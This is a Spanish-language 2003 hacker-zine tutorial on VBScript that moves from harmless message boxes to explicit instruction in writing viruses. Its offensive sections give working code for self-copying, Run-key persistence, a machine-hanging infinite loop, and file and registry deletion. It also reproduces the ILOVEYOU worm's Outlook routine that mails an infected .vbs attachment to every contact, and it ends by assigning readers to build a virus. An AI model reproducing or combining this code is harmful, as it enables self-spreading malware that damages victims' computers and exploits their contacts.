[016]_Tutorial_De_VbS_by_Saint_-_Disidents_Journal_5
 
                     -+-| DisidentS Hack Journal #5 |-+-
 
 
 
 
 
 
 
 
 
   ______________________________________________________________________
  |                                                                      |
  | -+- Titulo_____: Tutorial De VbS                                     |
  | -+- Autor______: Saint                                               |
  | -+- E-Mail_____: dsd_cracking@portadaauga.org                        |
  | -+- Team_______: DisidentS Argentina - www.karnakmx.com              |
  |______________________________________________________________________|
 
 
 
 
 
"la potencia sin control..no sirve de nada"
>>------------------------------------------------------------------------<<
 
 
 
----------------------------------------------------------------------------
----------------------------------------------------------------------------
 
.==========================================================================.
|===========~ INDICE ~======================================================
|===========================================================================
|=~ 1- Introducción                                                        |
|=~ 2- VBS In0fensiv0                                                      |
|=~ 3- Vbs 0Fens1v0                                                        |
|=~ 4- Técnicas con 0nd4 - I lov3 you? He He he...                         |
|=~ 5- T4r3a                                                               |
|=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=.
======================================================~ INDICE ~============
============================================================================
 
.==========================================================================.
|===========~ 1- Introducción. ~|===========================================
|===========================================================================
 


		Ésta es la primera vez que escribo un artículo. Así que espero 
que salga bien :-). La idea es que cuando hayas leído éste texto, manual, 
instructivo, tutorial o como te guste decirle... puedas hacer un virus en vbs...
 No te garantizo que sea el mejor virus de todos pero bue.. tené en cuenta que
 esT tipo de tutoriales no te pueden enseñar a tener ideas. De eso te 
encargás vos ;-) Qué quiero decir con que el tutorial no te puede enseñar a 
tener ideas? Bueno, muy pero muy simple. SI vos te creés que vas a sacar un 
virus tan conocido como lo fue el I love You en su época, como lo fue el
 Kournikova en su época, como lo fue el Mapson en su época te vas a tener
 que dedicar más tiempo. No te va a alcanzar con leer las cosas que yo escribo
 en éste texto. Vas a tener que ponerte las pilas e investigar. 
	Cómo hago para investigar?
Cuando un coder te dice investigá no te dice "sacá las cosas de tu cabeza,
 inventalas que si sos buen escritor de virus lo vas a saber..." NO, cuando
 un coder te dice investigá te está diciendo "leé otros códigos, estudiá de
 libros, tutoriales, buscá en google.com, preguntá a tus amigos". Si uno está 
verdaderamente apasionado con lo que hace, es capaz de preguntarle a cualquiera;
 no todos van a saber responder pero siempre va a haber alguien que te va a ayudar :-)
		Bueno, para terminar; lo más importante. Quiero agradecer al
 team, por todo lo que está haciendo para ayudarme y más que nada porque la
 metodología que tiene es muy interesante y hace que la gente como yo
 verdaderamente salga adelante :-)



-----------------------------------------------------------------------------
.==========================================================================.
|===========~ 2- VBS In0fensiv0. ~|=========================================
|===========================================================================
 


		Bueno, antes que nada quiero comentarles que, para que no se 
piensen que vbs es de goma; es un lenguaje de scripting. No quiere decir que
 sea un lenguaje de programación pero, normalmente; este tipo de lengaujes se
 utilizan para ayudar a programas muhco ma´s grosos, onda windows.. Si vas a 
inicio, buscar y ponés *.vbs vas a encontrarte con muchísimos archivos con 
extensión .vbs que son del sistema operativo.
		Antes que nada, si querés ver qué onda con eso de los vbs que
 usa windows después de haber leído este tutorial; tipo, leerlo comprensivamente
 al code te vas a dar cuenta que ta muy pero muy bueno para InVestigaR ... :)
		Vamos a empezar..

-------------------------------B0F------------------------------------------------
Mensajes de texto

Lo primero que hay que hacer para empezar a escribir en VBS es lo siguiente:
 entrar en el bloc de notas de windows, word pad o cualquier otro programa 
que sea editor de texto y escribir lo siguiente:


			MsgBox "Hola"

Una vez que escribimos esto, guardamos el archivo como "Hola.vbs" y lo ejecutamos
 haciendo doble click sobre el ícono. Si lo hicimos bien, aparecerá una pantalla 
de windows diciendo"hola".
		
		MsgBox es un comando de VBS, y se encarga de mostrar un Cuadro De
 Mensaje. En este caso el mensaje dice hola, pero también se puede ampliar y cambiar
 el contenido de su título y el tipo de ventana del mensaje. Por ejemplo:

			MsgBox "mensjje", tipodeventana, "título"

Si explicamos brevemente cada uno de estos argumentos tendremos:


mensaje: es el mensaje que aparecerá en la ventana, por ejemplo "Hola"
tpodeventana: es la forma que tendrá la ventana, puede ser de advertencia.
título: es el título que tendrá la ventana.

Finalmente, el tipo de ventana se indica con un número y algunas variantes están 
representadas en la sigiuente lista:


38 al 47 = Ventana Aceptar

vbexclamation = ventana de exclamación Aceptar
48 = ventana de exclamación Aceptar
49 = ventana de exclamación Aceptar/Cancelar
50 = ventana de exclamación Anular/Reintentar 
51 = ventana de exclamación Si/No/Cancelar
52 = ventana de exclamación Si/No
53 = ventana de exclamación Reintentar/Cancelar


------------------------------------------------------------------------

Introducción a las variables

-------------------------------------------------------------------------

 		Una variable es un pedacito de memoria que toma el programa
 que estamos creando (si es que utilizamos variables) en el que se almacena
 información. La idea de una variable es la de poder guardar información que
 puede ser dinámica, es decir, que puede ir cambiando a través del código.
 Por ejemplo:

			Saint = "hola"
			Titulo="Titulo_ventana"
			Msgbox Saint, 48, Titulo

		Lo que estamos haciendo ahí es hacer que en el MsgBox aparezca
 la información que está contenida en una variable, en este caso, en el MsgBox
 aparecerá la información que está en Saint y que aparece en la variable título.

ReCoRdAr:     Cuando 1 llama una variable desde el msgbox o desde donde sea, 
no hay que utilizar las comillas. Por eso, si hubiéramos 
escrito msgbox "Saint", 48, Titulo hubiera aparecido en la ventana Saint, en vez de hola.


-------------------------------------------------------------------

OPeraCiones Matemáticas :)

-----------------------------------------------------------------


		Bue... ésto lo llevan con ustds? jeje, aprendanlo... nadie nace 
aprendiendo ;) Onda que si esto no lo terminan de leer todo después van a tener 
que volver acá para ver como hacer una op. matematica.. ponganse las pilas y léanlo todo :)


			En realidad, se pueden hacer muchísimas cosas con
 éste tema, desde averiguar cuanto es 3 x 3 hasta averiguar el coseno o lo que 
sea de una variable x o y pero Güe... no me voy a meter mucho en todo eso ya que
 eso puede llegar a ir para la prox entrega :)

		A ver, nosotros vamos a ver como sumar, restar, multiplicar y dividir
 para poder hacer sumas y restas entre distintas fechas y ver cuanto falta para un 
cumple o lo que sea :)
		

	Si aparece esto:

			pancho = 1 * 2 ' acá estoy multiplicando 1 * 2 y lo estoy almacenando en la variable pancho
			
			roco = 10 / 2 ' acá estoy dividiendo 10 por 2 y el resultado va a ser 5.

	Una vez que se hicieron estas operaciones y se almacenaron en una variable
 cualunque vamos a poder llamarlas desde lo que sea... 

----------------------------------------------------------------------------------------

La InPutBox

---------------------------------------------------------------------------------------


		Para avanzar un pco más las cosas vamos a ver la input box...
 En realidad, se me ocurrió poner la input  box porque ayer, mientrs investigaba 
para poder hacer un tutorial interesante vi que se puede hacer un programita que 
ya les va a empezar a caer mejor ya que no es un tan simple msgbox; o sea... 
un programa con una sola línea.. Es un progrmaita con un par de líneas más y
 operadores onda mayor y menor

nom = INPUTBOX("Escribe tu nombre") 
edad = INPUTBOX("Escribe tu edad")
IF edad <18 THEN
MSGBOX(nom & " eres menor de edad")
ELSE
MSGBOX(nom & " eres mayor de edad") 
END IF

Bueno, acá.. veamos lo que sabemos:
 	Con lo que expliqué podemos deducir que en nom tenemos una inputbox que, 
aunque no sepamos que sea podemos ver tranquilamente que está contenido en una
 variable. Después, vemos un msgbox que escribe lo que había en nom y en edad... (dos variables)


		No te preocupes por el if y el else que hay ahí, ya te lo
 voy a explicar... Pero mirá, prestá atención al InputBox
	El InPutBox.. buen punto, ha? jeje miren.. una input box es lo siguiente:
				 
	Algo tan pero tan profesional como eso.. jeje, se logra con un solo
 inputbox("Escribe tu nombre"). Digamos, lo que hacemos cuando ponemos 
nom = inputbox("Escribe tu nombre") es tomar lo que se escribió por el 
usuario en la barrita de abajo cuando se clickeó en OK. Lo mismo pasa en
 edad pero bue, eso ta tdo bien, solucionado.. todos C0ntent0s :)

Ahora, veamos otra cosa, qué onda este If? De donde lo scaste papá? jeje.. 
bueno, miren, este if; aunque a ustds les parezca medio extraño y complicado se MERECE existir. 
Los if's, else's, else if's son "OPeradores <ondicionales". esto quiere decir
 que si yo escribo, tomando este ejemplo

IF edad <18 THEN
MSGBOX(nom & " eres menor de edad")
ELSE
MSGBOX(nom & " eres mayor de edad") 
END IF
Veamos, el If se fija si al edad es menor a 18.. Si la edad es menor a 18 entonces
 escribe un MSGBOX(nom & "eres menor de edad"). 
En cambio, no es menor de 18, es decir cualquier otro número que no esté por 
debajo de 18 va a decir MSGBOX (nom & "eres mayor de edad")
Y con el End If se cierra la condición del if..



------------------------------------------------------------------------------------------


Operadores de tiempo... Dias, Etc E Te Ce

------------------------------------------------------------------------------------------



		Bueno, los operadores de tiempo (AHem ahem..) Los operadores 
de tiempo nos pueden ayudar, aunque ustedes no lo crean a hacer distintas csas
 que la verdad son muy interesantes, tipo: si todavía no llegaron a ser la 1 de 
la tarde que el programa diga Buenos Días y que cuando ya son después de la 1 de
 la tarde el progrma diga Buenas tardes y ese tipo de cosas que la verdad que no
 parece pero le dan un toque de profesionalidad a los programas porque la gente
 que no programa dice Uh, este programa cambia la forma de saludar, la verdad que valió la pena tenerlo :)


		vAMOS Al Point

				hola = hour(now())
				if hola <=12 then
				msgbox "Buenos Días"
				else
				msgbox "Buenas tardes"
				end if

		Es algo simple pero queda bien, también se peude utilizar "Day(Now()) , Month(Now()) en fin, de todo"


------------------------------------------------------------------------------------------------

Acá se quedó el la parte de scripting inofensivo eN VBS.. esto quiere decir 
que ya fue, digamos, como dije antes VBS es un lenguaje de scripting, no nos 
podemos mandar un programa tipo notepad; se nos va a hacer mucho más difícil 
que programarlo en C o en visual basic pero bueno.. se pueden hacer más fáci
les algunas cosas que en realidad cuestan mucho hacer desde lenguajes de
 programación verdaderos y es por eso que sirve tenerlo en cuenta.



-----------------------------------------------------------------------------
.==========================================================================.
|===========~ 3- Vbs 0Fens1v0. ~|===========================================
|===========================================================================
 



			Uh... a ver a ver.. cómo empiezo esto? Miren, esto de
 programar en VBS es muy simple más que nada para hcer virus, lo único que 
tenés que hacer es saberte de memoria un par de nombres y encima, si sabés 
hablar en inglés estás hecho :) jejej, o sea, no requerís de más trabajo que
 aprenderte el "scripting.filesystemobject" y el "wscript.shelL" proque la
 verdad que el resto es muy pero muy simple. 
 			Cuando hayas llegado a la sección de I love you? te
 va a agarrar la locura de que pudiste haber hecho el I love you y que como
 un boludo estuviste mirando la tele o haciendo lo que fuera.. en vez de sacar
 un virus conocido. JEje, es lo que sentí yo, por lo menos :) Pero, tenés que 
tener en cuenta que x' más que quieras o no el chabón investigó muchísimo, en 
el momento que sacó ese virus no existía nada, de pedo tenías un tutorial de 
VBS que te venía con la ayuda de microsoft que la verdad era un quilombo de
 entender y ahora, hay un par de estos tutoriales com oel que estoy escribiendo
 yo pero la verdad que son incompletos o bien tardás meses en encontrar uno bueno
 así que por eso estoy tratando de ahcer lo mejor y poder sacar algo apra que a todo el mundo le sirva :)


-----------------------------------------------------------------------------

On error resuMe NexT

------------------------------------------------------------------------------


Algo muy pero + interesante para cuando ustds programen un virus, worm, parásito,
 en fin... lo que programen les va a ser muy útil el On error resume next Ésta 
sentencia se escribe normalmente al principio de un virus y su objetivo es el 
de poder hacer que el vrisu se siga ejecutando por más que tenga algún error
en el código entonces por ejemplo:

		On error resume next

		msgbx "Hola" '<-- hay un error al escribir msgbox...
		persona = inputbox("dame tu nombre")
		msgbox "hola" & persona

	Lo que se logra en este caso con el "On error resume next es que se pueda
 seguir ejecutando el código de fuente del virus por más que haya habido un programa 
con la escritura de msgbox más arriba. Entonces,  el programa mostrará una inputbox 
con y el resultado mostrará un msgbox con lo escrito en la variable sin importar
 que no tuviera éxito la línea atnerior

		El carácter "&" es el que nos ayuda a unir texto que incluímos
 nosotros con texto dinámico, como puede ser una variable. Entonces, cada vez que
 querramos utilizar una vairable y un texto jutnos en algún msgbox vamos a tener 
que escribir por ejemplo "buenos días sr. " & persona & "Un gusto".


------------------------------------------------------------------------------------

For ......... next

----------------------------------------------------------------------------------

El for..... next es una rutina interesante para agregar a  un código porque 
nos puede mostrar algo la cantidad de veces que lo indiquemos. Por ejemplo::

		for hola = 1 to 4
		msgbox jeje
		next

Acá, lo que se va a hacer es escribir un msgbox 4 veces porque éste está 
incluido dentro del for.
0j0, estas cosas se pueden cambiar, por ejemplo el hola lo podemos cambiar
 por otro nombre de variable, el msgbox puede ser cualqueir otra cosa, puede
 haber una inputbox o lo que sea... también puede haber una suma con un msgbxox
 mostrando la salida, hay infinidad de cosas para hacer

--------------------------------------------------------------------------------------

Do ....... L00p

---------------------------------------------------------------------------------------


El Do... LOop bue, el do loop normalmente se agrega al final de un código 
entero porque lo que se escriba dentro de esa rutina se repite infinitas veces
 dentro del código. Entonces, si nosotros queremos hacer algo onda colgar nuestra
 máquina o alguna otra cosa ponemos un do loop con algo jodóon en el medio y estamos hechos. 

Por jeemplo:


			Do
			Msgbox "Je"
			Loop

Ésto nos mata... es una instrucción que se va a repetir infinitas veces entonces,
imagínense tener infinita cantidad de estos mensajes molestos, vamos a tener que
 cerrar el proceso del programa o algo más groso aún porque hay veces que ni eso
 funciona. Es como que se cierren programas cada 1 nanosegundo; lo que son 1 sobre billón de segundo.
Una de las pocas formas de safar de esto es cerrar el proceso porque 
el programa pone al rendimiento de la máquina a trabajar a un 100% y la
 cuelga o si está prendido mucho tiempo puede joder algo. NO se los recomiendo :-)


--------------------------------------------------------------------------------------------------

Randomizing

--------------------------------------------------------------------------------------------------


		Ahora sí, vamos a ver que pasa con el Randomize en vbs... 
La idea del randomize es hacer que no siempre pase lo mismo cuando abrimos
 el programa si realizamos determinada acción por ejemplo:

				On error resume next

					Randomize
				jeje = int(rnd * 10)

					if jeje < 5 then
				msgbox "El rpgorama sacó un número menor que cinco"
					else
				msgbox "El programa sacó un número mayor que cinco"
					end if


Bueno, acá lo que pasa es lo sigiuente:

	jeje almacena una variable que tiene una función que hace int(rnd * 10). 
La idea de esto es que el programa saque al azar un número entre el 1 y el 10.
 Entonces, después el programa sigue una rutina = que la de siempre pero lo
 que cambia es que el programa elige por sí  mismo el número que saca. Entonces,
 si abrimos el programa una vez nos puede aparecer un número menor que cinco 
pero eso no quiere decir que la próxima vez que lo abramos va a aparecer un 
número mayor que cinco. Puede aparecer un número menor nuevamente, esto depende
 del programa, uno no puede modificar el resultado.


-----------------------------------------------------------------------------------

Manejo de Archivos utilizando VBs

Creación de Archivos

------------------------------------------------------------------------------------




		Bueno GenT.. Vamos a empezar con lo mejor del lenguaje,
 manejo de archivos. Con lo que vamos a poder hacer programas todavía más 
interesantes porque vamos a poder escribir en un archivo, copiarlo, eliminarlo,
 en fin.. Hay muchísimas opciones :)
	
	Lo primero que hay que tener en cuenta es que si nosotros queremos hacer 
un archivo, o sea.. crear un archivo con extensión .txt por ejemplo tenemos que 
llamar al Scripting.filesystemobject. para eso vamos a hacer lo siguiente

				set fso = createobject("scripting.filesystemobject")

		Lo que estamos haciendo acá arriba es crear en la variable fso un
 objeto que nos va a permitir hacer manejo de archivos

	Entonces, si queremos crear un archivo con información nuestra ponemos lo siguiente:

				variable1 = "cómo estás?"
				set fso = createobject("scripting.filesystemobject")
				set man = fso.createtextfile("c:\archivo_de_prueba.txt", True)
				man.writeline "hola"
				man.writeline variable1
				man.close

		La idea  es que al hacer esto, estamos creando un archivo que va
 a contener en la primera línea "hola", y en la segunda va a decir "cómo estás?".
 Luego, lo va a cerrar. Estamos escribiendo el comando true, después del path del
 archivo porque si escribiéramos False, habría un error si existiera el archivo ya
 que, en vez borrarlo no hace nada con el archivo. Es decir, que si existiera el
 archivo C:\archivo_de_prueba.txt de atnemano lo estaríamos sobreescribiendo si
 tuviéramos el comando True. O sea, el archivo anterior se borraría y se cambiaría
 por la información en el script.


			Si nosotros escribimos ésto:

				variable1 = "cómo estás?"
				set fso = createobject("scripting.filesystemobject")
				set man = fso.createtextfile("c:\archivo_de_prueba.txt", true)
				man.write "hola"
				man.writeblanklines 1
				man.write variable1
				man.close


		Obtenemos el mismo resultado pero para eso tuvimos que escribir
 writeblanklines 1, porque el método write no divide el texto en distintos renglones.


		Finalmente, la línea más importante es la siguiente:

				set man = fso.createtextfile("c:\archivo_de_prueba.txt", True)

		En ésta línea, se está creando el archivo, llamando al objeto fso 
y dando un nombre al objeto que se encarga de manipular el archivo.

		


-----------------------------------------------------------------

Abrir archivos

-----------------------------------------------------------------


		Si queremos abrir un archivo y guardar la información de 
éste en una variable para crear otro archivo con la información de éste 
abierto o para tener  la información en una variable podemos hacer lo siguiente:
	

				set fso = createobject("scripting.filesystemobject")
				set persona = fso.opentextfile("c:\archivo_de_prueba.txt")
				jaja = persona.readall
				set otroarchivo = fso.createtextfile("c:\otroarchivo.txt", True)
				otroarchivo.writeline jaja
				otroarchivo.close
		
		En éste caso lo que se está haciendo es escribir toda la 
información que hay en c:\archivo_de_prueba.txt a c:\otroarchivo.txt. 


				jaja = persona.readall

			Ésto indica que la variable contiene todo lo que se 
leyó cuando se abrió el archivo con el objeto persona.

		Y el resto.. Ya lo SaBen :-)


		También hay otra forma de leer archivos, pero eso se los dejo
 para que InVesTiGuEn :-). Busquen como abrir un archivo y leerlo por medio de
 un bucle While o Do Until EoF. La idea en ese caso es leer cada línea del archivo
 hasta que ése se termine y entonces cuando se termina el archivo se almacena en
 una variable o hace lo que sea que quieran hacer.


-------------------------------------------------

Copiar ArChiVos 

-------------------------------------------------

		Hola hoola hola... Arcivos por aquií, archivos por alliá :)

	Algo que les va a servir mucho en sus virus es la posibilidad de poder
 copiar un archivo tal como está en otra carpeta y con otro nombre.. La idea es
 muy simple. Tenemos que llamar al objeto FileSystemObject y estamos hechos :)

					set fso = createobject("Scripting.FileySystemObject")
					fso.copyfile wscript.scriptfullname, "c:\archivo_copiado.vbs"

		La idea es que una vez que hayan ejecutado este archivo .vbs 
se haya copiado con otro nombre al c:\. El wscript.scriptfullname indica que lo
 que queremos copiar es el vbs que se está ejecutando pero también podemos hacer
 que se copie otro archivo como por ejemplo

					set fso = createobject("Scripting.filesystemobject")
					fso.copyfile "c:\archivo_copiado.vbs", "c:\jaja.vbs"

		Esa es la onda que se curte el vbS para copiar archivos :-)


--------------------------------------------------------

Querés Mover archivos, HuH?

--------------------------------------------------------

		Bueno Bueno Bueno.... 

	Tipo, yo les explico como se puede usar, su uso es muy similar al de 
copiar archivos pero les doy una idea. Por qué no mover un archivo cuando es 
tal día? He He, acá aparece lo aprendido antes :P

		
					set fso = createobject("Scripting.filesystemobject")
					if Day(Now()) = 17 then
					fso.movefile "c:\archivo_copiado.vbs", "c:\jaja.vbs"
					else
					end if


--------------------------------------------------------

Borremos Archivos

--------------------------------------------------------

	Para borrar archivos no nos queda nada más que decir.. Es lo mismo que antes salvo que hay que cambiaar algo..

					set fso = createobject("Scripting.filesystemobject")
					fso.deletefile "c:\jaja.vbs"

--------------------------------------------------------

A crear y borrar carpetas

--------------------------------------------------------


	Borrar y crear carpetas también es fácil. Todo se lo debemos al objeto Fso(File System Object).

			set fso = createobject("Scripting.filesystemobject")
			fso.createfolder "C:\hola"

Crea la carpeta hola en el disco c

		
			set fso = createobject("Scripting.filesystemobject")
			fso.deletefolder "C:\hola"

Borra la carpeta hola del disco C




----------------------------------------------------------------


El ObjeTO Wscript
Cómo escribir en el registro

----------------------------------------------------------------

	Bueno, vamos a usar el Wscript más que nada para poder escribir en 
el registro y para que el virus ejecute aplicaciones. Entonces, el Wscript.Shell
 es un objeto que se puede llamar, al igual que el objeto File System Object. 
La idea es que se cumplen otras funciones, yo no puedo usar el Wscript.Shell 
para copiar o mover un archivo, simplemente porque no lo puede hacer, está 
armado para realizar otras funciones.


		Vamos al GraNo

set wsc = createobject("wscript.shell")
wsc.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\xXSaintXx", "C:\jaja.vbs"

Bueno, entonces

	Cuando nosotros agregamos esta órden a nuestro virus le estamos 
diciendo que cada vez que se prenda la computadora se prenda el virus. 
Ésto quiere decir, que nuestro virus se va a ejecutar siempre que el usuario
 reinicie la máquina, la apague, o entre en windows.


----------------------------------------------------------

Cómo LeeR Una clave en el registro

---------------------------------------------------------


Set wsc = CreateObject("WScript.Shell")
registro = wsc.regRead ("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\xXSaintXx")
if registro = "C:\jaja.vbs" then
msgbox "Infectado"
else
end if

Creo que esto casi no necesita explicación pero bueno, voy a dar una breve 
explicación. Guardo la clave del registro, que voy a leer en una variable que 
se llama registro y la comparo. Si la variable dice "C:\jaja.vbs" entonces hago 
algo. Ese algo es dar un cartel que dice Infectado :)

---------------------------------------------------------

Cómo borrar UnA ClaVe en El ReGistRo

---------------------------------------------------------

	Bueno, esto es lo Ante-úLtimo De la parte de Harmful VBS :) 

		Set wsc = CreateObject("WScript.Shell")
wsc.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\xXSaintXx"

	Lo que hace esto es borrar una clave del registro, en este caso la clave que creamos hace un rato.

------------------------------------------------------------

Cómo ejecutar archivos con Wscript.SheLl
-------------------------------------------------------------

		Esto es algo simple. Yo les recomiendo que se jueguen y que tipo,
 con los conocimentos que tienen armen con un createtextfile un archivo .html como
 por ejemplo se hizo con el virus I loVe YoU y que dsps lo ejecuten con ésto. VeAn

			set wsc = createobject("wscript.shell")
			wsc.run "calc.exe"

	Acá estoy corriendo la calculadora de windows pero tengan en cuenta que
 pueden correr lo que quieran. Desde la calculadora hasta el "c:\jaja.vbs" que creamos antes :)



-----------------------------------------------------------------------------
.==========================================================================.
|===========~ 4- Técnicas con 0nd4 - I lov3 you? He He he.... ~|============
|===========================================================================
 


		En realidad, no les voy a explicar el código de fuente del 
"I love you porque la verdad que no vale la pena, cada uno tiene que leerlo y
 estudiarlo por su cuenta y darse cuenta que uno sabe. Por ahí, hay un par de
 cosas que no se las expliqué, tipo las subrutinas como los sub's y eso pero 
bueno, eso es para que ustedes investiguen.
		Lo que yo considere que les tengo que enseñar lo van a tener más abajo.

				"ver txt con el virus"


--------------------------------------------------
Reproducción por e-mails
-------------------------------------------------

Ésto me pareció que vale la pena que lo explique porque es interesante poder,
 ya que uno hace su primer virus mandarlo por mail.

dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application") 
set mapi=out.GetNameSpace("MAPI") 
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
if (regad="") then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "ILOVEYOU"
male.Body = vbcrlf&"kindly check the attached LOVELETTER coming from me."
male.Attachments.Add(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs")
male.Send

		Lo que hace esta rutina es agarrar el objeto que manipula el 
outlook, listar todos los mails que haya en él y mandar el mail con el attach.




-----------------------------------------------------------------------------
.==========================================================================.
|===========~ 5- T4r3a. ~|==================================================
|===========================================================================
 


		Bueno, la idea es que hagan un virus con todo lo que hay en
 las dos secciones. Y que después me lo manden a mí para ver qué es lo que 
aprendieron :) Pero, InVesTiguEn.. No es necesario hacer un virus pedorro y
 rápido, la idea es hacer un virus como si fuera el último que podés llegar
 a hacer en tu vida pero que sea ExCelente. que hayamos puesto todo ahí, 
peleando y luchando con el block de notas porque no nos anda una línea del 
código y rompiéndonos la cabeza porque no podemos depurarlo :)
	También, tengan en cuenta a sus amigos, ejej. Es lo mejor para ayudarlos 
y si no tienen, serán ustedes los que ayuden a sus otros amigos :)

			Espero que les haya servido esto y si no entendieron 
algo por favor Contáctenme a mí o a alguien del team para que lo explique mejor.

			Eso es T0d0


-----------------------------------------------------------------------------
                   DisidentS Hacker Team 2003 (c).
 
----------------------------------------------------------------------------
                 Mail del Team: disidents@yahoo.es
----------------------------------------------------------------------------
 
                               0
                             X0 0X
                               S
